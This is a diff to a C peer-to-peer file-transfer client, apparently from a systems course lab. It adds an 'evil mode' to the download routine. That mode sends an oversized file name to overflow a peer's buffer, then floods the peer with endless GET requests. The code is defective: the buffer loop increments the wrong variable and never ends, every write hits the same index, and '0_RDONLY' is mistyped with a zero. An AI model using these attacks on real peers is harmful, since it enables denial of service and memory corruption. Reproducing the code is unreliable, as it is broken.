@@ -526,6 +526,35 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
+
+	//EVIL1) 
+	//file name overload ----> requests a file name that the good peer can't handle
+	if (evil_mode) //EVILMODE1
+	{
+		message("evil mode attempting filename overflow");
+		//do evil things
+		char evil_buffer[FILENAMESIZ*4];
+		int evil_i;
+		for (evil_i = 0; evil_i < FILENAMESIZ*4; i+=4)
+		{
+			evil_buffer[evil_i] = 'e';
+			evil_buffer[evil_i] = 'v';
+			evil_buffer[evil_i] = 'i';
+			evil_buffer[evil_i] = 'l';			
+		}
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", evil_buffer);
+	}
+
+	//EVIL2)
+	//Makes infinite requests from its peer
+	if(evil_mode)
+	{
+		message("evil mode attempting DOS");
+		while(1)
+		{
+			osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+		}
+	}
 	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
@@ -650,7 +679,14 @@ static void task_upload(task_t *t)
 	}
 	t->head = t->tail = 0;
 
-	t->disk_fd = open(t->filename, O_RDONLY);
+	if (evil_mode)
+	{
+		t->disk_fd = open(t->filename, 0_RDONLY);
+	}
+
+	else 
+		t->disk_fd = open(t->filename, O_RDONLY);
+	
 	if (t->disk_fd == -1) {
 		error("* Cannot open file %s", t->filename);
 		goto exit;
